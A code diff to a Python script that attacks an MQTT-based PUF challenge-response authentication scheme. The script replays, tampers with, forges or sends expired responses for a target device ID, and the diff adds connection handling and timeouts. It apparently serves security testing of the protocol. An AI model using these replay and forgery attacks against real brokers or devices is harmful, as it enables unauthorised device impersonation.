@@ -4,6 +4,7 @@ import argparse
 import json
 import secrets
 import sys
+import threading
 import time
 
 import paho.mqtt.client as mqtt
@@ -44,9 +45,16 @@ def expired_payload(uid: str, time_window: int) -> dict[str, str]:
 
 def run_attack(args: argparse.Namespace) -> None:
     client = mqtt.Client(mqtt.CallbackAPIVersion.VERSION2, client_id=f"puf-attack-{secrets.token_hex(4)}")
-    state: dict[str, dict[str, str]] = {}
+    action_done = threading.Event()
+    connected = threading.Event()
+    connection_error: list[str] = []
 
     def on_connect(client, userdata, flags, reason_code, properties):
+        if getattr(reason_code, "is_failure", False) or int(reason_code) != 0:
+            connection_error.append(f"MQTT connection failed: {reason_code}")
+            action_done.set()
+            return
+        connected.set()
         client.subscribe(args.challenge_topic, qos=1)
         client.subscribe(args.response_topic, qos=1)
 
@@ -58,31 +66,39 @@ def run_attack(args: argparse.Namespace) -> None:
         if not isinstance(payload, dict) or payload.get("uid") != args.uid:
             return
         if message.topic == args.response_topic:
-            state["response"] = payload
             if args.mode == "replay":
                 _publish(client, args.response_topic, payload, "replay")
+                action_done.set()
                 client.disconnect()
             elif args.mode == "tamper":
                 _publish(client, args.response_topic, tamper_payload(payload), "tamper")
+                action_done.set()
                 client.disconnect()
         elif message.topic == args.challenge_topic:
-            state["challenge"] = payload
             if args.mode == "forge":
                 _publish(client, args.response_topic, forge_payload(args.uid, payload), "forge")
+                action_done.set()
                 client.disconnect()
             elif args.mode == "expired":
                 # No key is used or required by this attacker.
                 _publish(client, args.response_topic, expired_payload(args.uid, args.time_window), "expired")
+                action_done.set()
                 client.disconnect()
 
     client.on_connect = on_connect
     client.on_message = on_message
-    client.connect(args.broker, args.port, keepalive=60)
-    client.loop_start()
-    deadline = time.monotonic() + args.timeout
     try:
-        while time.monotonic() < deadline and client.is_connected():
-            time.sleep(0.05)
+        client.connect(args.broker, args.port, keepalive=60)
+    except Exception as exc:
+        raise RuntimeError(f"MQTT connection failed: {exc}") from exc
+    client.loop_start()
+    try:
+        if not action_done.wait(args.timeout):
+            if not connected.is_set():
+                raise TimeoutError("timed out waiting for MQTT connection")
+            raise TimeoutError(f"timed out waiting for {args.mode} attack trigger")
+        if connection_error:
+            raise RuntimeError(connection_error[0])
     finally:
         client.loop_stop()
         client.disconnect()
@@ -102,4 +118,8 @@ def parse_args() -> argparse.Namespace:
 
 
 if __name__ == "__main__":
-    run_attack(parse_args())
+    try:
+        run_attack(parse_args())
+    except (RuntimeError, TimeoutError) as exc:
+        print(f"Attack failed: {exc}", file=sys.stderr)
+        sys.exit(1)
